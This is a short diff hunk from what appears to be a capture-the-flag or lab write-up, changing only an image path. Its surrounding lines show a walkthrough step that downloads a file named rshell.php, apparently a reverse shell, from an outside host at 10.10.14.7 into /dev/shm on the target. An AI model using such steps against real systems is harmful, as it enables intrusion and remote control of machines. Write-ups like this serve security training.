@@ -193,7 +193,7 @@ Let's try saving the file to /dev/shm instead:
 
 > http://10.10.14.7/rshell.php -o /dev/shm/rshell.php
 
-![](<../../.gitbook/assets/9 (1).JPG>)
+![](<../../.gitbook/assets/9 (1) (1).JPG>)
 
 We don't get any errors back, which is good. Let's see if we can list the files to confirm:
 
